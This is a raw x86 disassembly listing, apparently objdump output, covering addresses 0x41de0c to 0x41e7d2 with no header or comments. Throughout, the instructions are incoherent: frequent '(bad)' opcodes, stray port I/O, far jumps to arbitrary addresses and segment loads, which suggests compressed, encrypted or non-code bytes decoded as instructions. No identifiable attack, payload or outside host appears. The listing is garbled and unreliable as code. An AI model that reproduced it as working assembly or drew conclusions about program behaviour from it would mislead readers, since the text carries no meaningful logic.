  41de0c:	iret   
  41de0d:	sub    BYTE PTR [ecx],al
  41de0f:	adc    DWORD PTR [edi+esi*4-0x63],0xfffffff5
  41de14:	pop    ds
  41de15:	aam    0xab
  41de17:	sbb    bh,cl
  41de19:	push   edx
  41de1a:	lahf   
  41de1b:	pop    edi
  41de1c:	cmp    al,0x6b
  41de1e:	pop    esi
  41de1f:	pop    ecx
  41de20:	mov    ch,0x29
  41de22:	stos   BYTE PTR es:[edi],al
  41de23:	ror    BYTE PTR [eax+0x18bbadfe],cl
  41de29:	adc    BYTE PTR gs:[edi-0x76],bh
  41de2d:	pusha  
  41de2e:	lock jge 0x41de3a
  41de31:	bswap  eax
  41de33:	js     0x41ddc4
  41de35:	loop   0x41ddbd
  41de37:	aad    0x1d
  41de39:	cmp    DWORD PTR [esi-0x2eb97518],edi
  41de3f:	call   DWORD PTR [edi+edi*2+0x53]
  41de43:	pop    eax
  41de44:	adc    al,0x0
  41de46:	cmp    al,0xb0
  41de48:	out    0xc0,eax
  41de4a:	xchg   edi,eax
  41de4b:	test   al,0xbc
  41de4d:	fucomp st(4)
  41de4f:	outs   dx,DWORD PTR ds:[esi]
  41de50:	mov    esi,0xf011ac9f
  41de55:	mov    ebp,0xe2bbe286
  41de5a:	(bad)  
  41de5b:	or     BYTE PTR [eax-0x6c7fc3f5],ch
  41de61:	mov    ds:0x285ca236,al
  41de66:	mov    bh,0x71
  41de68:	pop    ebx
  41de69:	call   0xe610194d
  41de6e:	sbb    ecx,DWORD PTR [ebp-0x2e]
  41de71:	(bad)  
  41de72:	pop    edx
  41de73:	xor    edx,eax
  41de75:	adc    ah,dl
  41de77:	mov    al,ds:0xc0c3b73b
  41de7c:	xchg   ebp,eax
  41de7d:	mov    ds:0xcbc7af04,eax
  41de82:	rcr    BYTE PTR [esi+0x2d],1
  41de85:	sbb    BYTE PTR [esi+0x2b],ch
  41de88:	call   0x1f76e57e
  41de8d:	cli    
  41de8e:	dec    ebp
  41de8f:	loope  0x41de23
  41de91:	pop    edi
  41de92:	push   es
  41de93:	push   ecx
  41de94:	loope  0x41def3
  41de96:	(bad)  
  41de97:	and    BYTE PTR [esp+ecx*2-0x1c2b1063],bl
  41de9e:	icebp  
  41de9f:	inc    ebx
  41dea0:	push   ss
  41dea1:	push   es
  41dea2:	imul   eax,DWORD PTR [edx],0xac7f0127
  41dea8:	inc    ecx
  41dea9:	rcr    DWORD PTR [ebx+0x727f3c21],cl
  41deaf:	inc    ecx
  41deb0:	(bad)  
  41deb1:	cmc    
  41deb2:	out    dx,al
  41deb3:	nop
  41deb4:	xchg   ebp,eax
  41deb5:	xlat   BYTE PTR ds:[ebx]
  41deb6:	mov    eax,0x39dfb3e7
  41debb:	out    dx,al
  41debc:	mov    ch,0xa1
  41debe:	dec    edx
  41debf:	mov    edi,DWORD PTR [esi-0x5b13c2fb]
  41dec5:	imul   edx,ebp,0xffffffdd
  41dec8:	mov    esi,0x6aedc388
  41decd:	jns    0x41df15
  41decf:	retf   0x9124
  41ded2:	mov    edi,es
  41ded4:	or     DWORD PTR [ebp+0x5e],edi
  41ded7:	sub    eax,0x8c045da0
  41dedc:	xor    bl,BYTE PTR [edx-0x65]
  41dedf:	pop    esi
  41dee0:	leave  
  41dee1:	(bad)  
  41dee2:	mov    es,WORD PTR [edx]
  41dee4:	xor    BYTE PTR [ebx+0x13d38594],cl
  41deea:	push   edi
  41deeb:	sub    eax,0x4f117cb5
  41def0:	mov    esp,0xf81dbbae
  41def6:	push   edx
  41def7:	ins    BYTE PTR es:[edi],dx
  41def8:	pop    ecx
  41def9:	popa   
  41defa:	jecxz  0x41df23
  41defc:	push   eax
  41defd:	sub    al,0x17
  41deff:	push   ebp
  41df00:	loope  0x41df75
  41df02:	mov    esi,DWORD PTR [edi]
  41df04:	sbb    bh,BYTE PTR [esi+0x0]
  41df07:	retf   0x2952
  41df0a:	ss mov dl,0x60
  41df0d:	es jmp 0x41df2c
	...
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x942e9ce9
  41df82:	nop
  41df83:	mov    ebx,0x13e88
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	call   esp
  41df8e:	push   esp
  41df8f:	inc    esp
  41df90:	mov    ch,0x8
  41df92:	je     0x41dfdf
  41df94:	div    BYTE PTR [edi+ebp*2-0x54]
  41df98:	into   
  41df99:	inc    eax
  41df9a:	test   BYTE PTR [edi-0x3e],ch
  41df9d:	bound  esp,QWORD PTR [ebx]
  41df9f:	loop   0x41dfd6
  41dfa1:	adc    DWORD PTR [ebp-0x72],0x5d
  41dfa5:	adc    DWORD PTR [edx-0x5],esi
  41dfa8:	out    dx,al
  41dfa9:	in     al,0xcf
  41dfab:	cld    
  41dfac:	mov    esi,0xeb6c8d7f
  41dfb1:	add    al,0xf9
  41dfb3:	mov    al,0x10
  41dfb5:	xor    al,0x9b
  41dfb7:	xor    ebp,DWORD PTR cs:[ebx+0x79]
  41dfbb:	xchg   dh,dh
  41dfbd:	std    
  41dfbe:	clc    
  41dfbf:	inc    ebx
  41dfc0:	sbb    eax,0x4a7a5474
  41dfc5:	out    dx,eax
  41dfc6:	jb     0x41e01c
  41dfc8:	test   al,0xfc
  41dfca:	pop    eax
  41dfcb:	and    ebx,DWORD PTR [eax-0x13]
  41dfce:	mov    dl,0x24
  41dfd0:	arpl   WORD PTR [eax-0x7d],si
  41dfd3:	mov    bl,0x9e
  41dfd5:	(bad)  
  41dfd6:	xchg   ecx,eax
  41dfd7:	mov    ?,WORD PTR [ebx-0x67]
  41dfda:	mov    eax,ds:0xdd532a25
  41dfdf:	mov    edx,0xbb6a9136
  41dfe4:	jl     0x41e019
  41dfe6:	mov    ecx,0x83a04760
  41dfeb:	out    0x4f,al
  41dfed:	xchg   edx,eax
  41dfee:	sub    dl,cl
  41dff0:	inc    edx
  41dff1:	mov    WORD PTR [ecx-0x3d076367],es
  41dff7:	hlt    
  41dff8:	adc    DWORD PTR [ebp-0x19482e8d],ecx
  41dffe:	loope  0x41dfb2
  41e000:	aam    0x2
  41e002:	aas    
  41e003:	xchg   DWORD PTR [ebp-0x3b],ebx
  41e006:	mov    cl,0x44
  41e008:	add    edx,DWORD PTR [edi]
  41e00a:	(bad)  
  41e00b:	jecxz  0x41df9a
  41e00d:	mov    ds:0xc825af6,al
  41e012:	test   eax,0x5a75ac4f
  41e017:	pop    ds
  41e018:	jae    0x41df9b
  41e01a:	xor    al,BYTE PTR [ecx]
  41e01c:	leave  
  41e01d:	inc    esp
  41e01e:	push   0xffffffa7
  41e020:	fs daa 
  41e022:	pop    ebx
  41e023:	mov    edx,0xd032272e
  41e028:	dec    ebp
  41e029:	xchg   esp,eax
  41e02a:	lock lahf 
  41e02c:	lds    esi,FWORD PTR [edi]
  41e02e:	inc    edi
  41e02f:	pusha  
  41e030:	mov    ds:0x3f431be6,eax
  41e035:	mov    dl,0x4a
  41e037:	sbb    DWORD PTR [ecx+0x42cbabe4],ecx
  41e03d:	sub    BYTE PTR [ebx-0x3a4c94a8],al
  41e043:	jns    0x41e01a
  41e045:	fdivr  st(0),st
  41e047:	daa    
  41e048:	inc    ecx
  41e049:	dec    ebp
  41e04a:	push   edx
  41e04b:	std    
  41e04c:	popf   
  41e04d:	push   esi
  41e04e:	test   eax,0xb2a45a65
  41e053:	popa   
  41e054:	pop    es
  41e055:	pop    ebp
  41e056:	mov    ch,0xf1
  41e058:	dec    eax
  41e059:	ror    BYTE PTR [esi+edi*2],1
  41e05c:	xchg   edx,eax
  41e05d:	pop    ebp
  41e05e:	popa   
  41e05f:	mov    edx,0x7ee29412
  41e064:	push   0x89b65759
  41e069:	mov    ch,0xe3
  41e06b:	cmp    al,0xb4
  41e06d:	mov    BYTE PTR [eax-0x17cdb245],dl
  41e073:	push   ds
  41e074:	out    dx,eax
  41e075:	jle    0x41e01a
  41e077:	mov    edx,DWORD PTR [esi]
  41e079:	mov    ?,WORD PTR [ecx]
  41e07b:	mov    edi,0x28b8efaa
  41e080:	(bad)  
  41e082:	jl     0x41e04a
  41e084:	push   ecx
  41e085:	repz inc edi
  41e087:	mov    dh,0xb7
  41e089:	xchg   esi,eax
  41e08a:	push   ecx
  41e08b:	retf   
  41e08c:	lock pop ss
  41e08e:	das    
  41e08f:	mov    bl,0x0
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	fidiv  WORD PTR [ebp+0x3f8c5f12]
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    al,0x1
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	xchg   ebp,eax
  41e10d:	fwait
  41e10e:	ret    
  41e10f:	call   FWORD PTR [ebp-0x41]
  41e112:	shl    BYTE PTR [edi+0x12],cl
  41e115:	sbb    edx,edx
  41e117:	jmp    0xd2ab9286
  41e11c:	pop    ss
  41e11d:	loop   0x41e162
  41e11f:	sbb    edx,DWORD PTR [ebp+0x2f]
  41e122:	clc    
  41e123:	dec    edx
  41e124:	or     ch,bh
  41e126:	jmp    0x2fc941db
  41e12b:	les    edx,FWORD PTR [esi+0x33]
  41e12e:	in     al,0xaa
  41e130:	shl    DWORD PTR [esi+ebp*2],0x7f
  41e134:	fsub   QWORD PTR [esi]
  41e136:	or     DWORD PTR [edi-0x7],0x55ebb79a
  41e13d:	sti    
  41e13e:	inc    BYTE PTR [ecx]
  41e140:	test   eax,0xa0c85542
  41e145:	pop    DWORD PTR [esp+ebx*8]
  41e148:	fisub  WORD PTR [ebp+ebp*8-0x2f768a9a]
  41e14f:	jb     0x41e169
  41e151:	jo     0x41e0e7
  41e153:	xchg   ecx,eax
  41e154:	aaa    
  41e155:	mov    al,0x8e
  41e157:	pop    esi
  41e158:	dec    ecx
  41e159:	dec    ebx
  41e15a:	pop    ebx
  41e15b:	mov    al,ds:0x31c3fbba
  41e160:	daa    
  41e161:	outs   dx,DWORD PTR ds:[esi]
  41e162:	push   cs
  41e163:	mov    cs,WORD PTR [eax]
  41e165:	push   eax
  41e166:	(bad)  
  41e167:	fbld   TBYTE PTR [ecx]
  41e169:	cmc    
  41e16a:	cmp    eax,0x4aa75f0d
  41e16f:	outs   dx,BYTE PTR ds:[esi]
  41e170:	xor    BYTE PTR [ebp+0x3c],ah
  41e173:	mov    esi,0x350e1fad
  41e178:	and    edi,esp
  41e17a:	retf   
  41e17b:	dec    ebx
  41e17c:	xchg   BYTE PTR [edi],dh
  41e17e:	mov    al,0x9b
  41e180:	sub    BYTE PTR [ebp+0x26f7ec75],bh
  41e186:	sub    dl,dl
  41e188:	jno    0x41e1ac
  41e18a:	xchg   esp,eax
  41e18b:	jbe    0x41e11e
  41e18d:	ds jecxz 0x41e154
  41e190:	jmp    0x41e19b
  41e192:	out    dx,al
  41e193:	mov    bh,0xe2
  41e195:	adc    cl,ch
  41e197:	int3   
  41e198:	jge    0x41e11a
  41e19a:	cs jmp 0xc230b745
  41e1a0:	sbb    cl,BYTE PTR [ebx]
  41e1a2:	and    BYTE PTR [esi+0x5bd9af22],0x3b
  41e1a9:	ror    BYTE PTR [esi],cl
  41e1ab:	ret    0x3baf
  41e1ae:	dec    esp
  41e1af:	imul   ah
  41e1b1:	mov    al,BYTE PTR [edi-0x4878c0f0]
  41e1b7:	ins    BYTE PTR es:[edi],dx
  41e1b8:	(bad)  
  41e1b9:	lock mov esp,0x30420607
  41e1bf:	bound  ebx,QWORD PTR [edx+0x5b]
  41e1c2:	out    0x94,al
  41e1c4:	and    DWORD PTR [ebx+0x55155c3c],0xffffffa1
  41e1cb:	sbb    edi,DWORD PTR [ebx]
  41e1cd:	ins    DWORD PTR es:[edi],dx
  41e1ce:	sub    eax,0x8864b83a
  41e1d3:	mov    eax,ds:0x611026ec
  41e1d8:	xor    BYTE PTR [edx+ecx*1-0x4d5cc2a5],bl
  41e1df:	xchg   cl,cl
  41e1e1:	xor    ebx,DWORD PTR [edx-0x57]
  41e1e4:	out    0x21,eax
  41e1e6:	in     eax,0x56
  41e1e8:	int3   
  41e1e9:	pop    ds
  41e1ea:	test   DWORD PTR [ebp-0x2f],0x5f588977
  41e1f1:	mov    ch,ah
  41e1f3:	aaa    
  41e1f4:	dec    ebp
  41e1f5:	mov    dl,0x13
  41e1f7:	or     DWORD PTR [ebp+0x118bb001],0x30cd3db3
  41e201:	sub    ebp,DWORD PTR [edi-0xc]
  41e204:	xor    esi,DWORD PTR [esi-0x29046a96]
  41e20a:	in     al,0xc6
  41e20c:	into   
  41e20d:	sbb    ebx,DWORD PTR [edx+0x19]
	...
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0x25
  41e281:	mov    ?,ebp
  41e283:	jge    0x41e215
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	or     DWORD PTR [eax-0x71c6b0f],esp
  41e292:	loop   0x41e21e
  41e294:	jmp    0x41e23a
  41e296:	mov    esi,0xdace0408
  41e29b:	or     BYTE PTR [esi-0x3764f6f3],cl
  41e2a1:	leave  
  41e2a2:	pop    esi
  41e2a3:	mov    bl,BYTE PTR [eax]
  41e2a5:	add    BYTE PTR [eax+0x1a07054d],0x40
  41e2ac:	dec    ebx
  41e2ad:	stos   BYTE PTR es:[edi],al
  41e2ae:	inc    ecx
  41e2af:	call   0x1e83:0x4c445b32
  41e2b6:	arpl   si,ax
  41e2b8:	(bad)  
  41e2ba:	mov    DWORD PTR [edx-0x66],ebp
  41e2bd:	out    0x66,al
  41e2bf:	neg    DWORD PTR ds:0x570e0632
  41e2c5:	inc    ebx
  41e2c6:	fs gs (bad) 
  41e2c9:	sar    dl,cl
  41e2cb:	loop   0x41e270
  41e2cd:	xlat   BYTE PTR ds:[ebx]
  41e2ce:	fwait
  41e2cf:	adc    ah,al
  41e2d1:	scas   al,BYTE PTR es:[edi]
  41e2d2:	(bad)  
  41e2d3:	jns    0x41e31e
  41e2d5:	dec    esp
  41e2d6:	clc    
  41e2d7:	leave  
  41e2d8:	sub    dl,BYTE PTR [esi]
  41e2da:	mov    cs,WORD PTR [esi]
  41e2dc:	push   esi
  41e2dd:	sar    DWORD PTR [ecx+ebx*2+0x7e361f0c],cl
  41e2e4:	add    DWORD PTR [eax],ebp
  41e2e6:	cmp    dl,BYTE PTR [esi-0x46]
  41e2e9:	sbb    edx,esi
  41e2eb:	(bad)  
  41e2ec:	pop    ebp
  41e2ed:	cmp    esi,DWORD PTR [eax]
  41e2ef:	outs   dx,DWORD PTR ds:[esi]
  41e2f0:	cld    
  41e2f1:	jb     0x41e301
  41e2f3:	mov    eax,ds:0x216c8c67
  41e2f8:	sub    eax,0x26bcc72f
  41e2fd:	inc    edx
  41e2fe:	repz inc esi
  41e300:	and    esi,eax
  41e302:	dec    esp
  41e303:	mov    esp,DWORD PTR [esi+0x45a02177]
  41e309:	add    edi,DWORD PTR [ebp-0x59ea67eb]
  41e30f:	mov    ds:0x2c05b4a0,eax
  41e314:	sub    BYTE PTR [ecx-0x15],ch
  41e317:	cmp    eax,0xf56dda85
  41e31c:	mov    esi,0x2ed4b040
  41e321:	pushf  
  41e322:	xor    eax,0x655069ba
  41e327:	xor    al,0x39
  41e329:	or     DWORD PTR [edx+edi*2],edi
  41e32c:	xchg   esi,eax
  41e32d:	ret    
  41e32e:	jns    0x41e3a1
  41e330:	sti    
  41e331:	es out dx,eax
  41e333:	push   ecx
  41e334:	cwde   
  41e335:	jg     0x41e2c9
  41e337:	shl    BYTE PTR [ebp+0x34],cl
  41e33a:	or     eax,0xcd1fa6ff
  41e33f:	arpl   WORD PTR [edi],sp
  41e341:	inc    ebx
  41e342:	imul   edx,DWORD PTR [ecx-0x6b],0xffffff93
  41e346:	pop    ebx
  41e347:	loopne 0x41e325
  41e349:	test   eax,0x7efb488f
  41e34e:	cs jnp 0x41e34d
  41e351:	mov    eax,0xf2601497
  41e356:	pop    edx
  41e357:	loopne 0x41e3a9
  41e359:	sub    DWORD PTR [edi+0xb],edx
  41e35c:	js     0x41e31f
  41e35e:	nop    DWORD PTR [esp+edx*2+0x1250de77]
  41e366:	adc    BYTE PTR [ebx+ebx*4-0x1cb9b4e3],al
  41e36d:	(bad)  
  41e36f:	jbe    0x41e31c
  41e371:	and    dl,BYTE PTR [ebp+0xf]
  41e374:	retf   
  41e375:	sbb    eax,0xe8b885a0
  41e37a:	mov    ?,WORD PTR [bx+si+0x14]
  41e37e:	add    dl,BYTE PTR [edi-0x5f]
  41e381:	mov    ebp,0xa410c282
  41e386:	mov    ebp,0xd9fd2ada
  41e38b:	pop    es
  41e38c:	mul    DWORD PTR [ebx+eax*1+0x91]
	...
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x563d3709
  41e403:	sete   BYTE PTR [ecx+0x1]
  41e407:	add    BYTE PTR [ecx+eax*1],al
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	lods   eax,DWORD PTR ds:[esi]
  41e40e:	ss in  al,0xa6
  41e411:	sub    al,0xc5
  41e413:	test   dl,dl
  41e415:	jns    0x41e442
  41e417:	mov    edi,0x2a7a9977
  41e41c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e41d:	add    dl,BYTE PTR [eax]
  41e41f:	je     0x41e411
  41e421:	call   0x9277540e
  41e426:	dec    edi
  41e427:	dec    edi
  41e428:	retf   
  41e429:	dec    ebx
  41e42a:	pop    ebp
  41e42b:	aam    0xec
  41e42d:	adc    BYTE PTR [edi-0x79021cbc],cl
  41e433:	leave  
  41e434:	stos   BYTE PTR es:[edi],al
  41e435:	sub    al,0x16
  41e437:	mov    ds:0xad6622ff,al
  41e43c:	sbb    al,BYTE PTR [edi]
  41e43e:	(bad)  
  41e43f:	fpatan 
  41e441:	push   0xffffffcc
  41e443:	or     eax,0x4e88ca97
  41e448:	outs   dx,DWORD PTR ds:[esi]
  41e449:	inc    ebp
  41e44a:	inc    eax
  41e44b:	loopne 0x41e3cd
  41e44d:	test   bh,0xdb
  41e450:	(bad)  
  41e451:	fistp  DWORD PTR [edx+0x73]
  41e454:	push   ebp
  41e455:	and    BYTE PTR [esi+0x71cb242f],dl
  41e45b:	loopne 0x41e440
  41e45d:	jmp    0xbcac5361
  41e462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e463:	aas    
  41e464:	stc    
  41e465:	push   eax
  41e466:	nop
  41e467:	out    0x7a,al
  41e469:	xchg   ecx,eax
  41e46a:	movq   mm0,mm7
  41e46d:	push   edi
  41e46e:	scas   eax,DWORD PTR es:[edi]
  41e46f:	jmp    0x41e4b4
  41e471:	daa    
  41e472:	or     eax,0xebbc45ff
  41e477:	pop    ebp
  41e478:	xchg   DWORD PTR [edx+0x3ca5e951],edx
  41e47e:	or     BYTE PTR [edi],0x85
  41e481:	xchg   esi,eax
  41e482:	mov    ecx,0x4386f0d2
  41e487:	adc    eax,0x60c8c4e0
  41e48c:	out    dx,eax
  41e48d:	dec    eax
  41e48e:	add    esp,DWORD PTR [ecx]
  41e490:	cmp    bh,BYTE PTR [eax+eiz*1+0x114f3d4e]
  41e497:	jle    0x41e4c2
  41e499:	jns    0x41e49d
  41e49b:	pop    eax
  41e49c:	scas   al,BYTE PTR es:[edi]
  41e49d:	out    dx,al
  41e49e:	jmp    0xd7d948fa
  41e4a3:	inc    DWORD PTR [eax-0x75]
  41e4a6:	(bad)
  41e4aa:	setle  BYTE PTR [ebp-0x76cf07ae]
  41e4b1:	and    cl,0xac
  41e4b4:	push   edx
  41e4b5:	xlat   BYTE PTR ds:[ebx]
  41e4b6:	test   eax,0xcfc2c0e7
  41e4bb:	push   ecx
  41e4bc:	fisttp WORD PTR ds:0xb7091616
  41e4c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4c3:	fistp  WORD PTR [edi+0x1048eb47]
  41e4c9:	and    DWORD PTR [ebp-0x2e],ecx
  41e4cc:	jle    0x41e500
  41e4ce:	es int3 
  41e4d0:	dec    ebp
  41e4d1:	jb     0x41e4f2
  41e4d3:	repz inc esp
  41e4d5:	sbb    BYTE PTR [eax],ah
  41e4d7:	stc    
  41e4d8:	stos   DWORD PTR es:[edi],eax
  41e4d9:	mov    dl,0xf6
  41e4db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4dc:	leave  
  41e4dd:	xor    DWORD PTR [ebp+0x66],edi
  41e4e0:	xchg   esp,eax
  41e4e1:	cs repz test eax,0xeaf959c2
  41e4e8:	test   eax,0xcb9fcfdc
  41e4ed:	in     eax,0xd6
  41e4ef:	inc    edi
  41e4f0:	les    ebp,FWORD PTR [edi]
  41e4f2:	sbb    BYTE PTR [ecx+0x7e931a55],ch
  41e4f8:	retw   
  41e4fa:	mov    ds:0x78cda0a7,al
  41e4ff:	sbb    BYTE PTR [ebx+0x7],al
  41e502:	sar    DWORD PTR ds:0xb3da11d8,cl
  41e508:	icebp  
  41e509:	add    edi,DWORD PTR [edi+edi*8+0x2c46feaa]
	...
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5a9
  41e581:	xchg   ebp,eax
  41e582:	jmp    0x1847e45
  41e587:	add    BYTE PTR [ecx+eax*1],al
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	call   0x9da76eb9
  41e591:	hlt    
  41e592:	mov    ebx,0x5cc3f516
  41e597:	shr    BYTE PTR [edi+eax*2+0x454a57c7],0x3
  41e59f:	js     0x41e605
  41e5a1:	rcr    esi,cl
  41e5a3:	xchg   DWORD PTR [ebp-0x76cc792e],ecx
  41e5a9:	fbld   TBYTE PTR [eax*2-0x6206d5a7]
  41e5b0:	mov    bh,0xa1
  41e5b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5b3:	pushf  
  41e5b4:	in     eax,dx
  41e5b5:	xchg   ebp,eax
  41e5b6:	shr    ebp,0x53
  41e5b9:	ins    BYTE PTR es:[edi],dx
  41e5ba:	and    BYTE PTR [edi],al
  41e5bc:	lds    esi,FWORD PTR [edi+0x2d]
  41e5bf:	test   BYTE PTR [esi+0x1a],al
  41e5c2:	pop    eax
  41e5c3:	cdq    
  41e5c4:	mov    al,ds:0x5f79ad46
  41e5c9:	loopne 0x41e591
  41e5cb:	adc    eax,0xa43b3243
  41e5d0:	dec    ecx
  41e5d1:	mov    DWORD PTR [edi],edi
  41e5d3:	inc    edx
  41e5d4:	mov    eax,0xe36ce1f3
  41e5d9:	in     eax,dx
  41e5da:	mov    edi,0x29c6e068
  41e5df:	or     BYTE PTR [edi+0xb],dh
  41e5e2:	sahf   
  41e5e3:	inc    ebp
  41e5e4:	ret    
  41e5e5:	sub    BYTE PTR [edx+0x4cdbaa27],al
  41e5eb:	pmaxsw mm2,QWORD PTR [edi]
  41e5ee:	hlt    
  41e5ef:	xchg   ecx,eax
  41e5f0:	addr16 call 0x2ab0:0xf9f7b583
  41e5f8:	sbb    ch,bh
  41e5fa:	cmp    ah,BYTE PTR [eax+0x359ba022]
  41e600:	jno    0x41e5e1
  41e602:	pop    ss
  41e603:	pop    ebx
  41e604:	jbe    0x41e659
  41e606:	and    al,0x34
  41e608:	hlt    
  41e609:	cwde   
  41e60a:	jp     0x41e5d9
  41e60c:	push   ebp
  41e60d:	jmp    0x41e61b
  41e60f:	mov    ds:0x7da0e679,eax
  41e614:	(bad)  
  41e615:	aad    0x11
  41e617:	das    
  41e618:	sahf   
  41e619:	push   ebx
  41e61a:	xchg   esp,eax
  41e61b:	mov    cl,0x2f
  41e61d:	fidivr WORD PTR [ebx]
  41e61f:	scas   al,BYTE PTR es:[edi]
  41e620:	push   edi
  41e621:	int3   
  41e622:	nop    esi
  41e625:	fwait
  41e626:	inc    edx
  41e627:	pop    es
  41e628:	popf   
  41e629:	mov    dh,0x10
  41e62b:	pusha  
  41e62c:	xchg   ebp,eax
  41e62d:	push   eax
  41e62e:	pop    esi
  41e62f:	cmp    BYTE PTR [eax+ebp*4+0x64f318a2],0xd5
  41e637:	jle    0x41e5f8
  41e639:	mov    edx,DWORD PTR [eax+0x3b]
  41e63c:	pop    ss
  41e63d:	xor    BYTE PTR [edx-0x44],0xf
  41e641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e642:	std    
  41e643:	push   0xad41d151
  41e648:	jnp    0x41e67b
  41e64a:	outs   dx,DWORD PTR ds:[esi]
  41e64b:	adc    BYTE PTR [ebx],0x9d
  41e64e:	xor    edx,DWORD PTR [esp+eiz*2-0x4c]
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	mov    edi,0x7a22d827
  41e658:	shl    DWORD PTR [ecx+0x16d26e9e],cl
  41e65e:	mov    dh,0x44
  41e660:	jne    0x41e691
  41e662:	cmp    dh,cl
  41e664:	adc    DWORD PTR [ecx],esp
  41e666:	cwde   
  41e667:	xchg   ecx,eax
  41e668:	and    esi,esi
  41e66a:	lods   al,BYTE PTR ds:[esi]
  41e66b:	stos   DWORD PTR es:[edi],eax
  41e66c:	sbb    bh,BYTE PTR [esi-0x4f086dcb]
  41e672:	mov    ebx,0x30854f7b
  41e677:	push   0xffffffd0
  41e679:	jae    0x41e65d
  41e67b:	arpl   bx,bx
  41e67d:	es jecxz 0x41e68b
  41e680:	loope  0x41e6ad
  41e682:	mov    al,BYTE PTR [ebp-0x6a]
  41e685:	sub    al,0xfa
  41e687:	sub    eax,0x8999288d
  41e68c:	ins    DWORD PTR es:[edi],dx
  41e68d:	outs   dx,BYTE PTR ds:[esi]
  41e68e:	psubsw mm0,QWORD PTR [eax]
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ecx,DWORD PTR [eax-0x63a05443]
  41e705:	inc    ebx
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	jmp    0xd3701ebd
  41e711:	dec    esi
  41e712:	inc    ecx
  41e713:	push   esi
  41e714:	mov    ds:0x9af8d6e,eax
  41e719:	nop
  41e71a:	addr16 jmp 0x41e6c6
  41e71d:	and    DWORD PTR [eax-0xc],ebp
  41e720:	xchg   esi,ebx
  41e722:	sbb    DWORD PTR [edx],eax
  41e724:	xor    al,0x57
  41e726:	add    eax,0x9107e9f0
  41e72b:	rcl    al,cl
  41e72d:	imul   ebp,DWORD PTR [esi-0x19b6b9dc],0x62
  41e734:	imul   edi,DWORD PTR [esi],0x4a
  41e737:	sub    BYTE PTR [esi],dl
  41e739:	fdiv   DWORD PTR ds:0x31a0ac7c
  41e73f:	repnz loopne 0x41e733
  41e742:	shl    BYTE PTR [edx],cl
  41e744:	or     ah,BYTE PTR [esi-0x36]
  41e747:	cmp    edx,DWORD PTR [eax+ebp*4-0x3396824a]
  41e74e:	dec    eax
  41e74f:	dec    edx
  41e750:	mov    al,0x9f
  41e752:	fsub   QWORD PTR [edi+edi*2]
  41e755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e756:	pop    ss
  41e757:	pop    eax
  41e758:	sbb    eax,0xb2b90b9
  41e75d:	jmp    0xe46a:0xc6e57121
  41e764:	push   0xffffffc9
  41e766:	jmp    0x29f8:0x535391a0
  41e76d:	pop    edi
  41e76e:	out    0x6c,eax
  41e770:	add    eax,0xf8adbf1e
  41e775:	fdiv   QWORD PTR [ebx]
  41e777:	jge    0x41e739
  41e779:	mov    ecx,0xcfb3899a
  41e77e:	in     eax,0x37
  41e780:	and    BYTE PTR [eax+0x4803b77a],al
  41e786:	xor    ebx,DWORD PTR [eax+0x47294c9]
  41e78c:	cmp    al,ah
  41e78e:	(bad)  
  41e790:	jne    0x41e7cc
  41e792:	rol    DWORD PTR [esi],1
  41e794:	push   0xe1de155e
  41e799:	(bad)  
  41e79a:	push   ecx
  41e79b:	pop    eax
  41e79c:	lods   al,BYTE PTR ds:[esi]
  41e79d:	stc    
  41e79e:	stc    
  41e79f:	or     ch,BYTE PTR [eax-0x7e]
  41e7a2:	mov    esp,0xcf57a5d1
  41e7a7:	inc    ecx
  41e7a8:	test   eax,0x761adebd
  41e7ad:	mov    dh,0x15
  41e7af:	int    0x79
  41e7b1:	cmp    al,0xd5
  41e7b3:	sbb    DWORD PTR [eax+ecx*8],ecx
  41e7b6:	fsubr  DWORD PTR [ecx]
  41e7b8:	adc    edx,ebp
  41e7ba:	mov    bh,0xa3
  41e7bc:	in     eax,dx
  41e7bd:	pop    ecx
  41e7be:	je     0x41e7a6
  41e7c0:	sbb    edx,DWORD PTR [esi]
  41e7c2:	add    eax,DWORD PTR [ecx+eiz*2]
  41e7c5:	push   cs
  41e7c6:	out    dx,al
  41e7c7:	jg     0x41e7af
  41e7c9:	ret    
  41e7ca:	fidiv  DWORD PTR [esi+edx*4+0x313b57e]
  41e7d1:	inc    edx
  41e7d2:	aam    0x96
